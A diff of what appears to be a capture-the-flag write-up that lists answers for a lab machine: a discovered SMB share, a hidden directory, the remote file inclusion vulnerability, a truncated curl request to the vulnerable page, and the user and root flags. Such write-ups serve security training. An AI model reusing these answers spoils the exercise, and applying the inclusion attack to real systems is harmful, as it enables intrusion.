@@ -72,12 +72,14 @@ Samba enumeration revelead a share milsedyson => Suggesting username for Miles
 In the anonymous share there was a log file with what looked like passwords 
 ```
 
+
 2. What is the hidden directory? 
 > /45kra24zxs28v3yd
 
 ```
 Found in milesdyson smb share
 ```
+
 
 3. What is the vulnerability called when you can include a remote file for malicious purposes?
 > Remote file inclusion
@@ -89,8 +91,10 @@ curl http://10.10.52.194/45kra24zxs28v3yd/administrator/alerts/alertConfigField.
 
 ```
 
+
 4. What is the user flag?
 > 7ce5c2109a40f958099283600a9ae807
+
 
 5. What is the root flag?
 >3f0372db24753accc7179a282cd6a949
